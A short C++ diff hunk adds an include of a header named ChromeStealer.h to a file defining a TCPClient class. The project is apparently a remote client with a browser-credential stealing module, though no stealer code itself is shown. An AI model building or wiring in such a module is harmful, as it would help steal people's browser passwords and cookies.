@@ -14,6 +14,7 @@
 #include "IClient.h"
 #include "StaticTools.h"
 #include "RequestHandler.h"
+#include "ChromeStealer.h"
 
 class TCPClient : public IClient
 {
